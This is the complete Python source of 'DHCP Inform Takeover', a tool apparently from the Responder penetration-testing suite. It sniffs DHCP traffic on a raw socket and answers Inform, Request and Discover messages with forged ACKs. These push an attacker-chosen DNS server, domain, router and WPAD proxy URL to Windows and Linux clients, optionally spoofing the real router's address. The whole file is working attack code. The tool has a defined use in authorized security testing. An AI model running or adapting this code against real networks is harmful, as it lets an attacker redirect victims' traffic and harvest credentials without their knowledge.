#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys
import struct
import socket
import re
import optparse
import ConfigParser
import os

BASEDIR = os.path.realpath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.insert(0, BASEDIR)
from odict import OrderedDict
from packets import Packet
from utils import *

parser = optparse.OptionParser(usage='python %prog -I eth0 -d pwned.com -p 10.20.30.40 -s 10.20.30.1 -r 10.20.40.1', prog=sys.argv[0],)
parser.add_option('-I', '--interface',  action="store",      help="Interface name to use, example: eth0", metavar="eth0",dest="Interface")
parser.add_option('-d', '--dnsname',    action="store",      help="DNS name to inject, if you don't want to inject a DNS server, provide the original one.", metavar="pwned.com", default="pwned.com",dest="DNSNAME")
parser.add_option('-r', '--router',     action="store",      help="The ip address of the router or yours if you want to intercept traffic.", metavar="10.20.1.1",dest="RouterIP")
parser.add_option('-p', '--primary',    action="store",      help="The ip address of the original primary DNS server or yours", metavar="10.20.1.10",dest="DNSIP")
parser.add_option('-s', '--secondary',  action="store",      help="The ip address of the original secondary DNS server or yours", metavar="10.20.1.11",dest="DNSIP2")
parser.add_option('-n', '--netmask',    action="store",      help="The netmask of this network", metavar="255.255.255.0", default="255.255.255.0", dest="Netmask")
parser.add_option('-w', '--wpadserver', action="store",      help="Your WPAD server string", metavar="\"http://wpadsrv/wpad.dat\"", default="", dest="WPAD")
parser.add_option('-S',                 action="store_true", help="Spoof the router ip address",dest="Spoof")
parser.add_option('-R',                 action="store_true", help="Respond to DHCP Requests, inject linux clients (very noisy, this is sent on 255.255.255.255)", dest="Respond_To_Requests")
options, args = parser.parse_args()

def color(txt, code = 1, modifier = 0):
	return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)

if options.Interface is None:
	print color("[!]", 1, 1), "-I mandatory option is missing, please provide an interface."
	exit(-1)

if options.RouterIP is None:
	print color("[!]", 1, 1), "-r mandatory option is missing, please provide the router's IP."
	exit(-1)

if options.DNSIP is None:
	print color("[!]", 1, 1), "-p mandatory option is missing, please provide the primary DNS server ip address or yours."
	exit(-1)

if options.DNSIP2 is None:
	print color("[!]", 1, 1), "-s mandatory option is missing, please provide the secondary DNS server ip address or yours."
	exit(-1)


print '#############################################################################'
print '##                       DHCP INFORM TAKEOVER 0.2                          ##'
print '##                                                                         ##'
print '##        By default, this script will only inject a new DNS/WPAD          ##'
print '##                server to a Windows <= XP/2003 machine.                  ##'
print '##                                                                         ##'
print '##     To inject a DNS server/domain/route on a Windows >= Vista and       ##'
print '##               any linux box, use -R (can be noisy)                      ##'
print '##                                                                         ##'
print '##   Use `RespondTo` setting in Responder.conf for in-scope targets only.  ##'
print '#############################################################################'
print ''
print color('[*]', 2, 1), 'Listening for events...'

config = ConfigParser.ConfigParser()
config.read(os.path.join(BASEDIR,'Responder.conf'))
RespondTo           = filter(None, [x.upper().strip() for x in config.get('Responder Core', 'RespondTo').strip().split(',')])
DontRespondTo       = filter(None, [x.upper().strip() for x in config.get('Responder Core', 'DontRespondTo').strip().split(',')])
Interface           = options.Interface
Responder_IP        = FindLocalIP(Interface)
ROUTERIP            = options.RouterIP
NETMASK             = options.Netmask
DHCPSERVER          = Responder_IP
DNSIP               = options.DNSIP
DNSIP2              = options.DNSIP2
DNSNAME             = options.DNSNAME
WPADSRV             = options.WPAD.strip() + "\\n"
Spoof               = options.Spoof
Respond_To_Requests = options.Respond_To_Requests

if Spoof:
	DHCPSERVER = ROUTERIP

##### IP Header #####
class IPHead(Packet):
	fields = OrderedDict([
		("Version",           "\x45"),
		("DiffServices",      "\x00"),
		("TotalLen",          "\x00\x00"),
		("Ident",             "\x00\x00"),
		("Flags",             "\x00\x00"),
		("TTL",               "\x40"),
		("Protocol",          "\x11"),
		("Checksum",          "\x00\x00"),
		("SrcIP",             ""),
		("DstIP",             ""),
	])

class UDP(Packet):
	fields = OrderedDict([
		("SrcPort",           "\x00\x43"),
		("DstPort",           "\x00\x44"),
		("Len",               "\x00\x00"),
		("Checksum",          "\x00\x00"),
		("Data",              "\x00\x00"),
	])

	def calculate(self):
		self.fields["Len"] = struct.pack(">h",len(str(self.fields["Data"]))+8)

class DHCPACK(Packet):
	fields = OrderedDict([
		("MessType",          "\x02"),
		("HdwType",           "\x01"),
		("HdwLen",            "\x06"),
		("Hops",              "\x00"),
		("Tid",               "\x11\x22\x33\x44"),
		("ElapsedSec",        "\x00\x00"),
		("BootpFlags",        "\x00\x00"),
		("ActualClientIP",    "\x00\x00\x00\x00"),
		("GiveClientIP",      "\x00\x00\x00\x00"),
		("NextServerIP",      "\x00\x00\x00\x00"),
		("RelayAgentIP",      "\x00\x00\x00\x00"),
		("ClientMac",         "\xff\xff\xff\xff\xff\xff"),
		("ClientMacPadding",  "\x00" *10),
		("ServerHostname",    "\x00" * 64),
		("BootFileName",      "\x00" * 128),
		("MagicCookie",       "\x63\x82\x53\x63"),
		("DHCPCode",          "\x35"),              #DHCP Message
		("DHCPCodeLen",       "\x01"),
		("DHCPOpCode",        "\x05"),              #Msgtype(ACK)
		("Op54",              "\x36"),
		("Op54Len",           "\x04"),
		("Op54Str",           ""),                  #DHCP Server
		("Op51",              "\x33"),
		("Op51Len",           "\x04"),
		("Op51Str",           "\x00\x01\x51\x80"),  #Lease time, 1 day
		("Op1",               "\x01"),
		("Op1Len",            "\x04"),
		("Op1Str",            ""),                  #Netmask
		("Op15",              "\x0f"),
		("Op15Len",           "\x0e"),
		("Op15Str",           ""),                  #DNS Name
		("Op3",               "\x03"),
		("Op3Len",            "\x04"),
		("Op3Str",            ""),                  #Router
		("Op6",               "\x06"),
		("Op6Len",            "\x08"),
		("Op6Str",            ""),                  #DNS Servers
		("Op252",             "\xfc"),
		("Op252Len",          "\x04"),
		("Op252Str",          ""),                  #Wpad Server
		("Op255",             "\xff"),
		("Padding",           "\x00"),
	])

	def calculate(self):
		self.fields["Op54Str"]  = socket.inet_aton(DHCPSERVER)
		self.fields["Op1Str"]   = socket.inet_aton(NETMASK)
		self.fields["Op3Str"]   = socket.inet_aton(ROUTERIP)
		self.fields["Op6Str"]   = socket.inet_aton(DNSIP)+socket.inet_aton(DNSIP2)
		self.fields["Op15Str"]  = DNSNAME
		self.fields["Op252Str"] = WPADSRV
		self.fields["Op15Len"]  = struct.pack(">b",len(str(self.fields["Op15Str"])))
		self.fields["Op252Len"] = struct.pack(">b",len(str(self.fields["Op252Str"])))

class DHCPInformACK(Packet):
	fields = OrderedDict([
		("MessType",          "\x02"),
		("HdwType",           "\x01"),
		("HdwLen",            "\x06"),
		("Hops",              "\x00"),
		("Tid",               "\x11\x22\x33\x44"),
		("ElapsedSec",        "\x00\x00"),
		("BootpFlags",        "\x00\x00"),
		("ActualClientIP",    "\x00\x00\x00\x00"),
		("GiveClientIP",      "\x00\x00\x00\x00"),
		("NextServerIP",      "\x00\x00\x00\x00"),
		("RelayAgentIP",      "\x00\x00\x00\x00"),
		("ClientMac",         "\xff\xff\xff\xff\xff\xff"),
		("ClientMacPadding",  "\x00" *10),
		("ServerHostname",    "\x00" * 64),
		("BootFileName",      "\x00" * 128),
		("MagicCookie",       "\x63\x82\x53\x63"),
		("Op53",              "\x35\x01\x05"),      #Msgtype(ACK)
		("Op54",              "\x36"),
		("Op54Len",           "\x04"),
		("Op54Str",           ""),                  #DHCP Server
		("Op1",               "\x01"),
		("Op1Len",            "\x04"),
		("Op1Str",            ""),                  #Netmask
		("Op15",              "\x0f"),
		("Op15Len",           "\x0e"),
		("Op15Str",           ""),                  #DNS Name
		("Op3",               "\x03"),
		("Op3Len",            "\x04"),
		("Op3Str",            ""),                  #Router
		("Op6",               "\x06"),
		("Op6Len",            "\x08"),
		("Op6Str",            ""),                  #DNS Servers
		("Op252",             "\xfc"),
		("Op252Len",          "\x04"),
		("Op252Str",          ""),                  #Wpad Server.
		("Op255",             "\xff"),
	])

	def calculate(self):
		self.fields["Op54Str"]  = socket.inet_aton(DHCPSERVER)
		self.fields["Op1Str"]   = socket.inet_aton(NETMASK)
		self.fields["Op3Str"]   = socket.inet_aton(ROUTERIP)
		self.fields["Op6Str"]   = socket.inet_aton(DNSIP)+socket.inet_aton(DNSIP2)
		self.fields["Op15Str"]  = DNSNAME
		self.fields["Op252Str"] = WPADSRV
		self.fields["Op15Len"]  = struct.pack(">b",len(str(self.fields["Op15Str"])))
		self.fields["Op252Len"] = struct.pack(">b",len(str(self.fields["Op252Str"])))

def SpoofIP(Spoof):
	return ROUTERIP if Spoof else Responder_IP

def RespondToThisIP(ClientIp):

	if ClientIp.startswith('127.0.0.'):
		return False

	if len(RespondTo) and ClientIp not in RespondTo:
		return False

	if ClientIp in RespondTo or RespondTo == []:
		if ClientIp not in DontRespondTo:
			return True

	return False

def IsUDP(data):
	return True if data[0][23:24] == "\x11" else False

def ParseSrcDSTAddr(data):
	SrcIP = socket.inet_ntoa(data[0][26:30])
	DstIP = socket.inet_ntoa(data[0][30:34])
	SrcPort = struct.unpack('>H',data[0][34:36])[0]
	DstPort = struct.unpack('>H',data[0][36:38])[0]
	return SrcIP, SrcPort, DstIP, DstPort

def FindIP(data):
	IP = ''.join(re.findall('(?<=\x32\x04)[^EOF]*', data))
	return ''.join(IP[0:4])

def ParseDHCPCode(data):
	PTid        = data[4:8]
	Seconds     = data[8:10]
	CurrentIP   = socket.inet_ntoa(data[12:16])
	RequestedIP = socket.inet_ntoa(data[16:20])
	MacAddr     = data[28:34]
	MacAddrStr  = ':'.join('%02x' % ord(m) for m in MacAddr).upper()
	OpCode      = data[242:243]
	RequestIP   = data[245:249]

	# DHCP Inform
	if OpCode == "\x08": 
		IP_Header = IPHead(SrcIP = socket.inet_aton(SpoofIP(Spoof)), DstIP=socket.inet_aton(CurrentIP))
		Packet = DHCPInformACK(Tid=PTid, ClientMac=MacAddr, ActualClientIP=socket.inet_aton(CurrentIP), \
								GiveClientIP=socket.inet_aton("0.0.0.0"), \
								NextServerIP=socket.inet_aton("0.0.0.0"), \
								RelayAgentIP=socket.inet_aton("0.0.0.0"), \
								ElapsedSec=Seconds)

		Packet.calculate()
		Buffer = UDP(Data = Packet)
		Buffer.calculate()
		SendDHCP(str(IP_Header)+str(Buffer), (CurrentIP, 68))

		return 'Acknowleged DHCP Inform for IP: %s, Req IP: %s, MAC: %s Tid: %s' % (CurrentIP, RequestedIP, MacAddrStr, '0x'+PTid.encode('hex'))

	# DHCP Request
	if OpCode == "\x03" and Respond_To_Requests:
		IP = FindIP(data)
		if IP:
			IPConv = socket.inet_ntoa(IP)
			if RespondToThisIP(IPConv):
				IP_Header = IPHead(SrcIP = socket.inet_aton(SpoofIP(Spoof)), DstIP=IP)
				Packet = DHCPACK(Tid=PTid, ClientMac=MacAddr, GiveClientIP=IP, ElapsedSec=Seconds)
				Packet.calculate()

				Buffer = UDP(Data = Packet)
				Buffer.calculate()

				SendDHCP(str(IP_Header)+str(Buffer), (IPConv, 68))

				return 'Acknowleged DHCP Request for IP: %s, Req IP: %s, MAC: %s Tid: %s' % (CurrentIP, RequestedIP, MacAddrStr, '0x'+PTid.encode('hex'))

	# DHCP Discover
	if OpCode == "\x01" and Respond_To_Requests:
		IP = FindIP(data)
		if IP:
			IPConv = socket.inet_ntoa(IP)
			if RespondToThisIP(IPConv):
				IP_Header = IPHead(SrcIP = socket.inet_aton(SpoofIP(Spoof)), DstIP=IP)
				Packet = DHCPACK(Tid=PTid, ClientMac=MacAddr, GiveClientIP=IP, DHCPOpCode="\x02", ElapsedSec=Seconds)
				Packet.calculate()

				Buffer = UDP(Data = Packet)
				Buffer.calculate()

				SendDHCP(str(IP_Header)+str(Buffer), (IPConv, 0))

				return 'Acknowleged DHCP Discover for IP: %s, Req IP: %s, MAC: %s Tid: %s' % (CurrentIP, RequestedIP, MacAddrStr, '0x'+PTid.encode('hex'))

def SendDHCP(packet,Host):
	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
	s.sendto(packet, Host)

if __name__ == "__main__":
	s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
	s.bind((Interface, 0x0800))

	while True:
		try:
			data = s.recvfrom(65535)
			if IsUDP(data):
				SrcIP, SrcPort, DstIP, DstPort = ParseSrcDSTAddr(data)

				if SrcPort == 67 or DstPort == 67:
					ret = ParseDHCPCode(data[0][42:])
					if ret:
						print text("[DHCP] %s" % ret)

		except KeyboardInterrupt:
			sys.exit("\r%s Exiting..." % color('[*]', 2, 1))

